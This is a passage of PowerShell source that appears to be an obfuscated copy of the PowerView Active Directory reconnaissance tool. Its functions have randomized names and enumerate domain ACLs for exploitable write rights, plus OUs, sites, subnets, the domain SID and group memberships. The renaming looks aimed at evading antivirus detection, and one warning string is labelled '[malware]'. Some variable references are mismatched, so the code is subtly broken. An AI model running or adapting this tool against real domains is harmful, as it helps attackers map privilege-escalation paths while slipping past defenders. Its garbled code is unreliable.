        [String]
        $YtWADKZe99 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $JYnIcwBJ99 = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $fEdVcXRd99,

        [Switch]
        $uomKXjrL99,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $ZiReXCQu99 = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $WXufDIdO99 = @{}
        if ($PSBoundParameters['ResolveGUIDs']) { $WXufDIdO99['ResolveGUIDs'] = $MBygQsEI99 }
        if ($PSBoundParameters['RightsFilter']) { $WXufDIdO99['RightsFilter'] = $LpndzBiv99 }
        if ($PSBoundParameters['LDAPFilter']) { $WXufDIdO99['LDAPFilter'] = $RUtJqxpA99 }
        if ($PSBoundParameters['SearchBase']) { $WXufDIdO99['SearchBase'] = $leCQEaFf99 }
        if ($PSBoundParameters['Server']) { $WXufDIdO99['Server'] = $VmSwBdTN99 }
        if ($PSBoundParameters['SearchScope']) { $WXufDIdO99['SearchScope'] = $YtWADKZe99 }
        if ($PSBoundParameters['ResultPageSize']) { $WXufDIdO99['ResultPageSize'] = $JYnIcwBJ99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $WXufDIdO99['ServerTimeLimit'] = $fEdVcXRd99 }
        if ($PSBoundParameters['Tombstone']) { $WXufDIdO99['Tombstone'] = $uomKXjrL99 }
        if ($PSBoundParameters['Credential']) { $WXufDIdO99['Credential'] = $ZiReXCQu99 }

        $EEyCZzye99 = @{
            'Properties' = 'samaccountname,objectclass'
            'Raw' = $True
        }
        if ($PSBoundParameters['Server']) { $EEyCZzye99['Server'] = $VmSwBdTN99 }
        if ($PSBoundParameters['SearchScope']) { $EEyCZzye99['SearchScope'] = $YtWADKZe99 }
        if ($PSBoundParameters['ResultPageSize']) { $EEyCZzye99['ResultPageSize'] = $JYnIcwBJ99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $EEyCZzye99['ServerTimeLimit'] = $fEdVcXRd99 }
        if ($PSBoundParameters['Tombstone']) { $EEyCZzye99['Tombstone'] = $uomKXjrL99 }
        if ($PSBoundParameters['Credential']) { $EEyCZzye99['Credential'] = $ZiReXCQu99 }

        $QiaDxgyH99 = @{}
        if ($PSBoundParameters['Server']) { $QiaDxgyH99['Server'] = $VmSwBdTN99 }
        if ($PSBoundParameters['Credential']) { $QiaDxgyH99['Credential'] = $ZiReXCQu99 }

        $GsjFZYpL99 = @{}
    }

    PROCESS {
        if ($PSBoundParameters['Domain']) {
            $WXufDIdO99['Domain'] = $XQOKQXGr99
            $QiaDxgyH99['Domain'] = $XQOKQXGr99
        }

        uphold @ACLArguments | ForEach-Object {

            if ( ($_.ActiveDirectoryRights -match 'GenericAll|Write|Create|Delete') -or (($_.ActiveDirectoryRights -match 'ExtendedRight') -and ($_.AceQualifier -match 'Allow'))) {
                if ($_.SecurityIdentifier.Value -match '^S-1-5-.*-[1-9]\d{3,}$') {
                    if ($GsjFZYpL99[$_.SecurityIdentifier.Value]) {
                        $APVYQeBo99, $BjEHcUIU99, $XHyXWigz99, $ZwkAuqPO99 = $GsjFZYpL99[$_.SecurityIdentifier.Value]

                        $MPFFYDFi99 = New-Object PSObject
                        $MPFFYDFi99 | Add-Member NoteProperty 'ObjectDN' $_.ObjectDN
                        $MPFFYDFi99 | Add-Member NoteProperty 'AceQualifier' $_.AceQualifier
                        $MPFFYDFi99 | Add-Member NoteProperty 'ActiveDirectoryRights' $_.ActiveDirectoryRights
                        if ($_.ObjectAceType) {
                            $MPFFYDFi99 | Add-Member NoteProperty 'ObjectAceType' $_.ObjectAceType
                        }
                        else {
                            $MPFFYDFi99 | Add-Member NoteProperty 'ObjectAceType' 'None'
                        }
                        $MPFFYDFi99 | Add-Member NoteProperty 'AceFlags' $_.AceFlags
                        $MPFFYDFi99 | Add-Member NoteProperty 'AceType' $_.AceType
                        $MPFFYDFi99 | Add-Member NoteProperty 'InheritanceFlags' $_.InheritanceFlags
                        $MPFFYDFi99 | Add-Member NoteProperty 'SecurityIdentifier' $_.SecurityIdentifier
                        $MPFFYDFi99 | Add-Member NoteProperty 'IdentityReferenceName' $APVYQeBo99
                        $MPFFYDFi99 | Add-Member NoteProperty 'IdentityReferenceDomain' $BjEHcUIU99
                        $MPFFYDFi99 | Add-Member NoteProperty 'IdentityReferenceDN' $XHyXWigz99
                        $MPFFYDFi99 | Add-Member NoteProperty 'IdentityReferenceClass' $ZwkAuqPO99
                        $MPFFYDFi99
                    }
                    else {
                        $XHyXWigz99 = jiggering -aCzrnrLk99 $_.SecurityIdentifier.Value -hKoxCyte99 DN @ADNameArguments

                        if ($XHyXWigz99) {
                            $BjEHcUIU99 = $XHyXWigz99.SubString($XHyXWigz99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                            $EEyCZzye99['Domain'] = $BjEHcUIU99
                            $EEyCZzye99['Identity'] = $XHyXWigz99
                            $Object = grow @ObjectSearcherArguments

                            if ($Object) {
                                $APVYQeBo99 = $Object.Properties.samaccountname[0]
                                if ($Object.Properties.objectclass -match 'computer') {
                                    $ZwkAuqPO99 = 'computer'
                                }
                                elseif ($Object.Properties.objectclass -match 'group') {
                                    $ZwkAuqPO99 = 'group'
                                }
                                elseif ($Object.Properties.objectclass -match 'user') {
                                    $ZwkAuqPO99 = 'user'
                                }
                                else {
                                    $ZwkAuqPO99 = $Null
                                }

                                $GsjFZYpL99[$_.SecurityIdentifier.Value] = $APVYQeBo99, $BjEHcUIU99, $XHyXWigz99, $ZwkAuqPO99

                                $MPFFYDFi99 = New-Object PSObject
                                $MPFFYDFi99 | Add-Member NoteProperty 'ObjectDN' $_.ObjectDN
                                $MPFFYDFi99 | Add-Member NoteProperty 'AceQualifier' $_.AceQualifier
                                $MPFFYDFi99 | Add-Member NoteProperty 'ActiveDirectoryRights' $_.ActiveDirectoryRights
                                if ($_.ObjectAceType) {
                                    $MPFFYDFi99 | Add-Member NoteProperty 'ObjectAceType' $_.ObjectAceType
                                }
                                else {
                                    $MPFFYDFi99 | Add-Member NoteProperty 'ObjectAceType' 'None'
                                }
                                $MPFFYDFi99 | Add-Member NoteProperty 'AceFlags' $_.AceFlags
                                $MPFFYDFi99 | Add-Member NoteProperty 'AceType' $_.AceType
                                $MPFFYDFi99 | Add-Member NoteProperty 'InheritanceFlags' $_.InheritanceFlags
                                $MPFFYDFi99 | Add-Member NoteProperty 'SecurityIdentifier' $_.SecurityIdentifier
                                $MPFFYDFi99 | Add-Member NoteProperty 'IdentityReferenceName' $APVYQeBo99
                                $MPFFYDFi99 | Add-Member NoteProperty 'IdentityReferenceDomain' $BjEHcUIU99
                                $MPFFYDFi99 | Add-Member NoteProperty 'IdentityReferenceDN' $XHyXWigz99
                                $MPFFYDFi99 | Add-Member NoteProperty 'IdentityReferenceClass' $ZwkAuqPO99
                                $MPFFYDFi99
                            }
                        }
                        else {
                            Write-Warning "[malware] Unable to convert SID '$($_.SecurityIdentifier.Value )' to a distinguishedname with jiggering"
                        }
                    }
                }
            }
        }
    }
}


function even {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.OU')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [String[]]
        $aCzrnrLk99,

        [ValidateNotNullOrEmpty()]
        [String]
        [Alias('GUID')]
        $VKonGJAa99,

        [ValidateNotNullOrEmpty()]
        [String]
        $XQOKQXGr99,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $RUtJqxpA99,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $kaLEgole99,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $leCQEaFf99,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $VmSwBdTN99,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $YtWADKZe99 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $JYnIcwBJ99 = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $fEdVcXRd99,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $iKRjUkvW99,

        [Switch]
        $uomKXjrL99,

        [Alias('ReturnOne')]
        [Switch]
        $iRGTotKK99,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $ZiReXCQu99 = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    BEGIN {
        $xfOIjAld99 = @{}
        if ($PSBoundParameters['Domain']) { $xfOIjAld99['Domain'] = $XQOKQXGr99 }
        if ($PSBoundParameters['Properties']) { $xfOIjAld99['Properties'] = $kaLEgole99 }
        if ($PSBoundParameters['SearchBase']) { $xfOIjAld99['SearchBase'] = $leCQEaFf99 }
        if ($PSBoundParameters['Server']) { $xfOIjAld99['Server'] = $VmSwBdTN99 }
        if ($PSBoundParameters['SearchScope']) { $xfOIjAld99['SearchScope'] = $YtWADKZe99 }
        if ($PSBoundParameters['ResultPageSize']) { $xfOIjAld99['ResultPageSize'] = $JYnIcwBJ99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $xfOIjAld99['ServerTimeLimit'] = $fEdVcXRd99 }
        if ($PSBoundParameters['SecurityMasks']) { $xfOIjAld99['SecurityMasks'] = $iKRjUkvW99 }
        if ($PSBoundParameters['Tombstone']) { $xfOIjAld99['Tombstone'] = $uomKXjrL99 }
        if ($PSBoundParameters['Credential']) { $xfOIjAld99['Credential'] = $ZiReXCQu99 }
        $kRrxGxxp99 = foaling @SearcherArguments
    }

    PROCESS {
        if ($kRrxGxxp99) {
            $zdhlwIap99 = ''
            $cqPynTGG99 = ''
            $aCzrnrLk99 | Where-Object {$_} | ForEach-Object {
                $JmddWUUS99 = $_.Replace('(', '\28').Replace(')', '\29')
                if ($JmddWUUS99 -match '^OU=.*') {
                    $zdhlwIap99 += "(distinguishedname=$JmddWUUS99)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        $MuprcxcZ99 = $JmddWUUS99.SubString($JmddWUUS99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[even] Extracted domain '$MuprcxcZ99' from '$JmddWUUS99'"
                        $xfOIjAld99['Domain'] = $MuprcxcZ99
                        $kRrxGxxp99 = foaling @SearcherArguments
                        if (-not $kRrxGxxp99) {
                            Write-Warning "[even] Unable to retrieve domain searcher for '$MuprcxcZ99'"
                        }
                    }
                }
                else {
                    try {
                        $osroZIBb99 = (-Join (([Guid]$JmddWUUS99).ToByteArray() | ForEach-Object {$_.ToString('X').PadLeft(2,'0')})) -Replace '(..)','\$1'
                        $zdhlwIap99 += "(objectguid=$osroZIBb99)"
                    }
                    catch {
                        $zdhlwIap99 += "(name=$JmddWUUS99)"
                    }
                }
            }
            if ($zdhlwIap99 -and ($zdhlwIap99.Trim() -ne '') ) {
                $cqPynTGG99 += "(|$zdhlwIap99)"
            }

            if ($PSBoundParameters['GPLink']) {
                Write-Verbose "[even] Searching for OUs with $VKonGJAa99 set in the gpLink property"
                $cqPynTGG99 += "(gplink=*$VKonGJAa99*)"
            }

            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[even] Using additional LDAP filter: $RUtJqxpA99"
                $cqPynTGG99 += "$RUtJqxpA99"
            }

            $kRrxGxxp99.filter = "(&(objectCategory=organizationalUnit)$cqPynTGG99)"
            Write-Verbose "[even] even filter string: $($kRrxGxxp99.filter)"

            if ($PSBoundParameters['FindOne']) { $vDOGrGBR99 = $kRrxGxxp99.FindOne() }
            else { $vDOGrGBR99 = $kRrxGxxp99.FindAll() }
            $vDOGrGBR99 | Where-Object {$_} | ForEach-Object {
                if ($PSBoundParameters['Raw']) {
                    $OU = $_
                }
                else {
                    $OU = meridian -kaLEgole99 $_.Properties
                }
                $OU.PSObject.TypeNames.Insert(0, 'PowerView.OU')
                $OU
            }
            if ($vDOGrGBR99) {
                try { $vDOGrGBR99.dispose() }
                catch {
                    Write-Verbose "[even] Error disposing of the Results object: $_"
                }
            }
            $kRrxGxxp99.dispose()
        }
    }
}


function breastbones {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.Site')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [String[]]
        $aCzrnrLk99,

        [ValidateNotNullOrEmpty()]
        [String]
        [Alias('GUID')]
        $VKonGJAa99,

        [ValidateNotNullOrEmpty()]
        [String]
        $XQOKQXGr99,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $RUtJqxpA99,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $kaLEgole99,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $leCQEaFf99,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $VmSwBdTN99,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $YtWADKZe99 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $JYnIcwBJ99 = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $fEdVcXRd99,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $iKRjUkvW99,

        [Switch]
        $uomKXjrL99,

        [Alias('ReturnOne')]
        [Switch]
        $iRGTotKK99,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $ZiReXCQu99 = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    BEGIN {
        $xfOIjAld99 = @{
            'SearchBasePrefix' = 'CN=Sites,CN=Configuration'
        }
        if ($PSBoundParameters['Domain']) { $xfOIjAld99['Domain'] = $XQOKQXGr99 }
        if ($PSBoundParameters['Properties']) { $xfOIjAld99['Properties'] = $kaLEgole99 }
        if ($PSBoundParameters['SearchBase']) { $xfOIjAld99['SearchBase'] = $leCQEaFf99 }
        if ($PSBoundParameters['Server']) { $xfOIjAld99['Server'] = $VmSwBdTN99 }
        if ($PSBoundParameters['SearchScope']) { $xfOIjAld99['SearchScope'] = $YtWADKZe99 }
        if ($PSBoundParameters['ResultPageSize']) { $xfOIjAld99['ResultPageSize'] = $JYnIcwBJ99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $xfOIjAld99['ServerTimeLimit'] = $fEdVcXRd99 }
        if ($PSBoundParameters['SecurityMasks']) { $xfOIjAld99['SecurityMasks'] = $iKRjUkvW99 }
        if ($PSBoundParameters['Tombstone']) { $xfOIjAld99['Tombstone'] = $uomKXjrL99 }
        if ($PSBoundParameters['Credential']) { $xfOIjAld99['Credential'] = $ZiReXCQu99 }
        $PxmkwvdW99 = foaling @SearcherArguments
    }

    PROCESS {
        if ($PxmkwvdW99) {
            $zdhlwIap99 = ''
            $cqPynTGG99 = ''
            $aCzrnrLk99 | Where-Object {$_} | ForEach-Object {
                $JmddWUUS99 = $_.Replace('(', '\28').Replace(')', '\29')
                if ($JmddWUUS99 -match '^CN=.*') {
                    $zdhlwIap99 += "(distinguishedname=$JmddWUUS99)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        $MuprcxcZ99 = $JmddWUUS99.SubString($JmddWUUS99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[breastbones] Extracted domain '$MuprcxcZ99' from '$JmddWUUS99'"
                        $xfOIjAld99['Domain'] = $MuprcxcZ99
                        $PxmkwvdW99 = foaling @SearcherArguments
                        if (-not $PxmkwvdW99) {
                            Write-Warning "[breastbones] Unable to retrieve domain searcher for '$MuprcxcZ99'"
                        }
                    }
                }
                else {
                    try {
                        $osroZIBb99 = (-Join (([Guid]$JmddWUUS99).ToByteArray() | ForEach-Object {$_.ToString('X').PadLeft(2,'0')})) -Replace '(..)','\$1'
                        $zdhlwIap99 += "(objectguid=$osroZIBb99)"
                    }
                    catch {
                        $zdhlwIap99 += "(name=$JmddWUUS99)"
                    }
                }
            }
            if ($zdhlwIap99 -and ($zdhlwIap99.Trim() -ne '') ) {
                $cqPynTGG99 += "(|$zdhlwIap99)"
            }

            if ($PSBoundParameters['GPLink']) {
                Write-Verbose "[breastbones] Searching for sites with $VKonGJAa99 set in the gpLink property"
                $cqPynTGG99 += "(gplink=*$VKonGJAa99*)"
            }

            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[breastbones] Using additional LDAP filter: $RUtJqxpA99"
                $cqPynTGG99 += "$RUtJqxpA99"
            }

            $PxmkwvdW99.filter = "(&(objectCategory=site)$cqPynTGG99)"
            Write-Verbose "[breastbones] breastbones filter string: $($PxmkwvdW99.filter)"

            if ($PSBoundParameters['FindOne']) { $vDOGrGBR99 = $PxmkwvdW99.FindAll() }
            else { $vDOGrGBR99 = $PxmkwvdW99.FindAll() }
            $vDOGrGBR99 | Where-Object {$_} | ForEach-Object {
                if ($PSBoundParameters['Raw']) {
                    $Site = $_
                }
                else {
                    $Site = meridian -kaLEgole99 $_.Properties
                }
                $Site.PSObject.TypeNames.Insert(0, 'PowerView.Site')
                $Site
            }
            if ($vDOGrGBR99) {
                try { $vDOGrGBR99.dispose() }
                catch {
                    Write-Verbose "[breastbones] Error disposing of the Results object"
                }
            }
            $PxmkwvdW99.dispose()
        }
    }
}


function nationalists {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.Subnet')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [String[]]
        $aCzrnrLk99,

        [ValidateNotNullOrEmpty()]
        [String]
        $ZBmuuCEe99,

        [ValidateNotNullOrEmpty()]
        [String]
        $XQOKQXGr99,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $RUtJqxpA99,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $kaLEgole99,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $leCQEaFf99,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $VmSwBdTN99,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $YtWADKZe99 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $JYnIcwBJ99 = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $fEdVcXRd99,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $iKRjUkvW99,

        [Switch]
        $uomKXjrL99,

        [Alias('ReturnOne')]
        [Switch]
        $iRGTotKK99,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $ZiReXCQu99 = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    BEGIN {
        $xfOIjAld99 = @{
            'SearchBasePrefix' = 'CN=Subnets,CN=Sites,CN=Configuration'
        }
        if ($PSBoundParameters['Domain']) { $xfOIjAld99['Domain'] = $XQOKQXGr99 }
        if ($PSBoundParameters['Properties']) { $xfOIjAld99['Properties'] = $kaLEgole99 }
        if ($PSBoundParameters['SearchBase']) { $xfOIjAld99['SearchBase'] = $leCQEaFf99 }
        if ($PSBoundParameters['Server']) { $xfOIjAld99['Server'] = $VmSwBdTN99 }
        if ($PSBoundParameters['SearchScope']) { $xfOIjAld99['SearchScope'] = $YtWADKZe99 }
        if ($PSBoundParameters['ResultPageSize']) { $xfOIjAld99['ResultPageSize'] = $JYnIcwBJ99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $xfOIjAld99['ServerTimeLimit'] = $fEdVcXRd99 }
        if ($PSBoundParameters['SecurityMasks']) { $xfOIjAld99['SecurityMasks'] = $iKRjUkvW99 }
        if ($PSBoundParameters['Tombstone']) { $xfOIjAld99['Tombstone'] = $uomKXjrL99 }
        if ($PSBoundParameters['Credential']) { $xfOIjAld99['Credential'] = $ZiReXCQu99 }
        $HIvnpSLS99 = foaling @SearcherArguments
    }

    PROCESS {
        if ($HIvnpSLS99) {
            $zdhlwIap99 = ''
            $cqPynTGG99 = ''
            $aCzrnrLk99 | Where-Object {$_} | ForEach-Object {
                $JmddWUUS99 = $_.Replace('(', '\28').Replace(')', '\29')
                if ($JmddWUUS99 -match '^CN=.*') {
                    $zdhlwIap99 += "(distinguishedname=$JmddWUUS99)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        $MuprcxcZ99 = $JmddWUUS99.SubString($JmddWUUS99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[nationalists] Extracted domain '$MuprcxcZ99' from '$JmddWUUS99'"
                        $xfOIjAld99['Domain'] = $MuprcxcZ99
                        $HIvnpSLS99 = foaling @SearcherArguments
                        if (-not $HIvnpSLS99) {
                            Write-Warning "[nationalists] Unable to retrieve domain searcher for '$MuprcxcZ99'"
                        }
                    }
                }
                else {
                    try {
                        $osroZIBb99 = (-Join (([Guid]$JmddWUUS99).ToByteArray() | ForEach-Object {$_.ToString('X').PadLeft(2,'0')})) -Replace '(..)','\$1'
                        $zdhlwIap99 += "(objectguid=$osroZIBb99)"
                    }
                    catch {
                        $zdhlwIap99 += "(name=$JmddWUUS99)"
                    }
                }
            }
            if ($zdhlwIap99 -and ($zdhlwIap99.Trim() -ne '') ) {
                $cqPynTGG99 += "(|$zdhlwIap99)"
            }

            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[nationalists] Using additional LDAP filter: $RUtJqxpA99"
                $cqPynTGG99 += "$RUtJqxpA99"
            }

            $HIvnpSLS99.filter = "(&(objectCategory=subnet)$cqPynTGG99)"
            Write-Verbose "[nationalists] nationalists filter string: $($HIvnpSLS99.filter)"

            if ($PSBoundParameters['FindOne']) { $vDOGrGBR99 = $HIvnpSLS99.FindOne() }
            else { $vDOGrGBR99 = $HIvnpSLS99.FindAll() }
            $vDOGrGBR99 | Where-Object {$_} | ForEach-Object {
                if ($PSBoundParameters['Raw']) {
                    $sGxqhjFT99 = $_
                }
                else {
                    $sGxqhjFT99 = meridian -kaLEgole99 $_.Properties
                }
                $sGxqhjFT99.PSObject.TypeNames.Insert(0, 'PowerView.Subnet')

                if ($PSBoundParameters['SiteName']) {
                    if ($sGxqhjFT99.properties -and ($sGxqhjFT99.properties.siteobject -like "*$ZBmuuCEe99*")) {
                        $sGxqhjFT99
                    }
                    elseif ($sGxqhjFT99.siteobject -like "*$ZBmuuCEe99*") {
                        $sGxqhjFT99
                    }
                }
                else {
                    $sGxqhjFT99
                }
            }
            if ($vDOGrGBR99) {
                try { $vDOGrGBR99.dispose() }
                catch {
                    Write-Verbose "[nationalists] Error disposing of the Results object: $_"
                }
            }
            $HIvnpSLS99.dispose()
        }
    }
}


function beauteous {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [ValidateNotNullOrEmpty()]
        [String]
        $XQOKQXGr99,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $VmSwBdTN99,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $ZiReXCQu99 = [Management.Automation.PSCredential]::Empty
    )

    $xfOIjAld99 = @{
        'LDAPFilter' = '(userAccountControl:1.2.840.113556.1.4.803:=8192)'
    }
    if ($PSBoundParameters['Domain']) { $xfOIjAld99['Domain'] = $XQOKQXGr99 }
    if ($PSBoundParameters['Server']) { $xfOIjAld99['Server'] = $VmSwBdTN99 }
    if ($PSBoundParameters['Credential']) { $xfOIjAld99['Credential'] = $ZiReXCQu99 }

    $DCSID = Rankine @SearcherArguments -iRGTotKK99 | Select-Object -First 1 -ExpandProperty objectsid

    if ($DCSID) {
        $DCSID.SubString(0, $DCSID.LastIndexOf('-'))
    }
    else {
        Write-Verbose "[beauteous] Error extracting domain SID for '$XQOKQXGr99'"
    }
}


function grownup {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.Group')]
    [CmdletBinding(DefaultParameterSetName = 'AllowDelegation')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $aCzrnrLk99,

        [ValidateNotNullOrEmpty()]
        [Alias('UserName')]
        [String]
        $RAWtpuWe99,

        [Switch]
        $eXxHshMC99,

        [ValidateSet('DomainLocal', 'NotDomainLocal', 'Global', 'NotGlobal', 'Universal', 'NotUniversal')]
        [Alias('Scope')]
        [String]
        $bUbMsIdH99,

        [ValidateSet('Security', 'Distribution', 'CreatedBySystem', 'NotCreatedBySystem')]
        [String]
        $HxhdZfRE99,

        [ValidateNotNullOrEmpty()]
        [String]
        $XQOKQXGr99,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $RUtJqxpA99,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $kaLEgole99,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $leCQEaFf99,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $VmSwBdTN99,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $YtWADKZe99 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $JYnIcwBJ99 = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $fEdVcXRd99,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $iKRjUkvW99,

        [Switch]
        $uomKXjrL99,

        [Alias('ReturnOne')]
        [Switch]
        $iRGTotKK99,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $ZiReXCQu99 = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    BEGIN {
        $xfOIjAld99 = @{}
        if ($PSBoundParameters['Domain']) { $xfOIjAld99['Domain'] = $XQOKQXGr99 }
        if ($PSBoundParameters['Properties']) { $xfOIjAld99['Properties'] = $kaLEgole99 }
        if ($PSBoundParameters['SearchBase']) { $xfOIjAld99['SearchBase'] = $leCQEaFf99 }
        if ($PSBoundParameters['Server']) { $xfOIjAld99['Server'] = $VmSwBdTN99 }
        if ($PSBoundParameters['SearchScope']) { $xfOIjAld99['SearchScope'] = $YtWADKZe99 }
        if ($PSBoundParameters['ResultPageSize']) { $xfOIjAld99['ResultPageSize'] = $JYnIcwBJ99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $xfOIjAld99['ServerTimeLimit'] = $fEdVcXRd99 }
        if ($PSBoundParameters['SecurityMasks']) { $xfOIjAld99['SecurityMasks'] = $iKRjUkvW99 }
        if ($PSBoundParameters['Tombstone']) { $xfOIjAld99['Tombstone'] = $uomKXjrL99 }
        if ($PSBoundParameters['Credential']) { $xfOIjAld99['Credential'] = $ZiReXCQu99 }
        $wlpGtuuA99 = foaling @SearcherArguments
    }

    PROCESS {
        if ($wlpGtuuA99) {
            if ($PSBoundParameters['MemberIdentity']) {

                if ($xfOIjAld99['Properties']) {
                    $xCZOySkJ99 = $xfOIjAld99['Properties']
                }

                $xfOIjAld99['Identity'] = $RAWtpuWe99
                $xfOIjAld99['Raw'] = $True

                grow @SearcherArguments | ForEach-Object {
                    $hBXziMOQ99 = $_.GetDirectoryEntry()

                    $hBXziMOQ99.RefreshCache('tokenGroups')

                    $hBXziMOQ99.TokenGroups | ForEach-Object {
                        $hybwYFBb99 = (New-Object System.Security.Principal.SecurityIdentifier($_,0)).Value

                        if ($hybwYFBb99 -notmatch '^S-1-5-32-.*') {
                            $xfOIjAld99['Identity'] = $hybwYFBb99
                            $xfOIjAld99['Raw'] = $False
                            if ($xCZOySkJ99) { $xfOIjAld99['Properties'] = $xCZOySkJ99 }
                            $Group = grow @SearcherArguments
                            if ($Group) {
                                $Group.PSObject.TypeNames.Insert(0, 'PowerView.Group')
                                $Group
                            }
                        }
                    }
                }
            }
            else {
                $zdhlwIap99 = ''
                $cqPynTGG99 = ''
                $aCzrnrLk99 | Where-Object {$_} | ForEach-Object {
                    $JmddWUUS99 = $_.Replace('(', '\28').Replace(')', '\29')
                    if ($JmddWUUS99 -match '^S-1-') {
                        $zdhlwIap99 += "(objectsid=$JmddWUUS99)"
                    }
                    elseif ($JmddWUUS99 -match '^CN=') {
                        $zdhlwIap99 += "(distinguishedname=$JmddWUUS99)"
                        if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                            $MuprcxcZ99 = $JmddWUUS99.SubString($JmddWUUS99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                            Write-Verbose "[grownup] Extracted domain '$MuprcxcZ99' from '$JmddWUUS99'"
                            $xfOIjAld99['Domain'] = $MuprcxcZ99
                            $wlpGtuuA99 = foaling @SearcherArguments
                            if (-not $wlpGtuuA99) {
                                Write-Warning "[grownup] Unable to retrieve domain searcher for '$MuprcxcZ99'"
                            }
                        }
                    }
                    elseif ($JmddWUUS99 -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                        $osroZIBb99 = (([Guid]$JmddWUUS99).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                        $zdhlwIap99 += "(objectguid=$osroZIBb99)"
                    }
                    elseif ($JmddWUUS99.Contains('\')) {
